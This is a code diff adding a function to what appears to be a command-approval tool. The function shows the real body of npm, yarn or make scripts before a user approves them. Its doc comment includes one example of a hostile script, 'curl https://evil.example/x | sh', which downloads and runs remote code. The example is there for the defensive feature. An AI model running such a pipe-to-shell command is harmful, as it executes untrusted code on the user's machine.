@@ -354,3 +354,58 @@ export function pathishArgs(args: string[]): string[] {
 export function isSecretPath(p: string): boolean {
   return secretReason(p) !== null;
 }
+
+
+/**
+ * What `npm run build` will actually execute.
+ *
+ * The single most valuable thing in the approval prompt, and the reason is one
+ * example: a README in a repository you just cloned says to run `npm run setup`,
+ * and `package.json` defines that as `curl https://evil.example/x | sh`. The argv
+ * looks like every other build step. Nothing in `npm run setup` tells the user
+ * what they are agreeing to.
+ *
+ * Showing the body turns "approve `npm run setup`?" into "approve
+ * `curl https://evil.example/x | sh`?", which is a question anybody answers
+ * correctly. It does not decide anything — it just stops the prompt from hiding
+ * the only part that matters.
+ *
+ * Returns null when there is nothing to show, which is not an error: plenty of
+ * commands are exactly what they appear to be.
+ */
+export async function scriptBody(cwd: string, command: string, args: string[]): Promise<string | null> {
+  const bin = path.basename(String(command || ""));
+  const positional = args.filter((a) => !a.startsWith("-"));
+
+  if (["npm", "pnpm", "yarn", "bun"].includes(bin)) {
+    // `npm run x`, and yarn's bare `yarn x` shorthand.
+    const name = positional[0] === "run" || positional[0] === "run-script" ? positional[1] : bin === "yarn" ? positional[0] : null;
+    if (!name) return null;
+    try {
+      const pkg = JSON.parse(await fs.readFile(path.join(cwd, "package.json"), "utf8"));
+      const body = pkg?.scripts?.[name];
+      return typeof body === "string" ? body : null;
+    } catch {
+      return null;
+    }
+  }
+
+  if (bin === "make" || bin === "gmake") {
+    const target = positional[0] ?? "";
+    if (!target) return null;
+    for (const file of ["Makefile", "makefile", "GNUmakefile"]) {
+      try {
+        const text = await fs.readFile(path.join(cwd, file), "utf8");
+        // The recipe: lines indented with a tab, under `target:`.
+        const re = new RegExp(`^${target.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}\\s*:[^\\n]*\\n((?:\\t[^\\n]*\\n?)+)`, "m");
+        const m = re.exec(text);
+        if (m) return m[1].replace(/^\t/gm, "").trimEnd();
+      } catch {
+        /* try the next spelling */
+      }
+    }
+    return null;
+  }
+
+  return null;
+}
